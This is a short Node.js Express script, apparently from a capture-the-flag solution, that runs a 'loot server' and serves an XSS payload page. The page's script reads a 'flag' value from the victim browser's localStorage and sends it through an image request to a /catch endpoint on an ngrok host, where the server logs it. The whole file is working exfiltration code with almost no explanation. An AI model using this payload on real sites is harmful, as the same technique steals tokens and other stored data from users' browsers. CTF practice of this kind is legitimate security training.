const express = require('express');
const app     = express();
app.use(require('body-parser').urlencoded({extended:false}));

// 2-a. Endpoint that receives the flag
app.get('/catch', (req,res)=>{
  console.log('[+] FLAG RECEIVED →', req.query.f);
  res.send('thx');
});

// 2-b. XSS payload page served at /x
app.get('/x', (_,res)=>{
  res.type('html').send(`
<!doctype html>
<title>X</title>
<script>
  // grab the flag that the bot stored earlier
  const flag = localStorage.getItem('flag');
  if(flag){
     // exfiltrate to our /catch endpoint
     const img = new Image();
     img.src = 'http://${process.env.HOST_NGROK}/catch?f=' + encodeURIComponent(flag);
  }
</script>
`);
});

app.listen(8080, ()=> console.log('Loot server on :8080'));
